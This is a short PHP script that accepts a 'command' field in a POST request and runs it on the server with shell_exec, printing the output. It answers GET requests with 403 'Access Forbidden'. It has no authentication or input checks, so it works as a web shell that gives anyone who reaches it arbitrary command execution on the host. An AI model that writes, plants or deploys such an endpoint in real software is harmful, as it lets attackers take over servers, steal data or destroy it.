<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'] ?? '';

    if (!empty($command)) {
        // Change directory to the server's desired directory
        chdir('../'); // Replace with the actual path

        // Execute the command on the server
        $output = shell_exec($command);
        
        echo ($output !== null) ? htmlentities($output) : 'Command executed successfully.';
    } else {
        echo 'No command provided.';
    }
} else {
    header('HTTP/1.1 403 Forbidden');
    echo 'Access Forbidden.';
}
?>